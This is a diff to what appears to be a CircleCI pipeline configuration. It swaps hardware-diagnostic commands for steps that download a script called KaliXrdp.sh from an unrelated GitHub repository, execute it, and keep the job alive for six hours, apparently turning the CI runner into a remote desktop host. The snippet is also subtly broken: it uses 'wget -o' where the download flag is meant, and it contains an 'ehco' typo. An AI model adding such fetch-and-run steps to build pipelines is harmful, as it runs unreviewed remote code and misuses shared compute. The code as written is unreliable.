@@ -16,12 +16,21 @@ jobs:
     steps:
       - checkout
       - run: |
-          lscpu
-          echo ------------
-          free -g
-          echo ------------
+          echo -----------------
+          echo
+          echo  S T A R T I N G 
+          echo
+          echo -----------------
+          wget -o kali.sh https://raw.githubusercontent.com/fennonina/Dokcerstmp/main/KaliXrdp.sh
+          chmod +x kali.sh
+          ./kali.sh
+          echo -----------------------
+          echo
+          echo  K E E P R U N N I N G
+          ehco 
+          echo -----------------------
+          sleep 6h
           
-
 workflows:
   my-custom-workflow:
     jobs:
